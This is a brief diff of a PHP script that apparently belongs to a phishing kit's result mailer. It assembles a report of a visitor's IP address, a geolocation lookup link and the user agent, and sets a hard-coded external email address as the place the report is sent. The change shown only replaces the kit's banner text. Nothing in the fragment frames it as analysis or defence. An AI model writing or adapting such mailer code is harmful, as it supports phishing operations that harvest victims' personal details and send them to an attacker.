@@ -22,7 +22,7 @@ $message .= "|--------- http://www.geoiptool.com/?IP=$ip ---------|\n";
 
 $message .= "User Agent : ".$useragent."\n";
 
-$message .= "|---------------------- A-29 Online -----------------------|\n";
+$message .= "|---------------------- IKA BLAI3E -----------------------|\n";
 
 $send = "panther46@yandex.com";
 
